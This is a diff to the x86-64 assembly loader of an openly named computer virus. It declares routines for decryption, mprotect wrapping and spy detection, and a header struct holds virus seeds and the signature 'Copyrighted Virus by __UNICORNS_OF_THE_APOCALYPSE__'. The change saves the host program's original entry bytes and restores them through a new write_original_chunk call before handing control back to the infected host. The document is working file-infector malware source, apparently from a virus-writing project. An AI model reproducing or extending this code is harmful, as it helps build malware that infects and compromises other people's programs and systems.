@@ -21,6 +21,7 @@ extern virus
 extern wrap_decypher
 extern wrap_mprotect
 extern detect_spy
+extern write_original_chunk
 
 ;----------------------------------; backup all swappable registers
 ;                                    (all but rax, rsp, rbp)
@@ -56,11 +57,13 @@ mark_below:
 	mov r10, rdx
 	mov r11, rdx
 	mov r14, rdx
+	mov r15, rdx
 	add r8, 16                 ; align vars to correct addresses
 	add r9, 24
 	add r10, 32
 	add r11, 40
 	add r14, 48
+	add r15, 56
 	mov r8, [r8]               ; dereference vars
 	mov r9, [r9]
 	mov r10, [r10]
@@ -80,6 +83,7 @@ mark_below:
 	xchg r12, r11
 	sub r11, r12               ; r11 = rcx - r11
 
+	push r15                   ; save entry copy    [rsp + 56]
 	push r14                   ; save virus size    [rsp + 48]
 	push rcx                   ; save loader_entry  [rsp + 40]
 	push r8                    ; save ptld addr     [rsp + 32]
@@ -118,8 +122,17 @@ mark_below:
 
 ;----------------------------------; restore state, return to client code
 return_to_client:
+	mov rdi, [rsp + 8]
+	mov rsi, [rsp + 56]
+	mov rdx, 16
+	push rdi
+	push rsi
+	push rdx
+	call write_original_chunk
+	add rsp, 24
+
 	mov rax, [rsp + 8]         ; get entry addr
-	add rsp, 56                ; restore stack as it was
+	add rsp, 64                ; restore stack as it was
 
 ;----------------------------------; restore registers
 	pop r15                    ; restore r15
@@ -145,4 +158,5 @@ virus_header_struct:
 	db 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff ; virus seed[1]
 	db "rel ptld", "ptldsize", "relvirus"
 	db "relentry", "virusize"
+	db "entry  beginning"
 	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
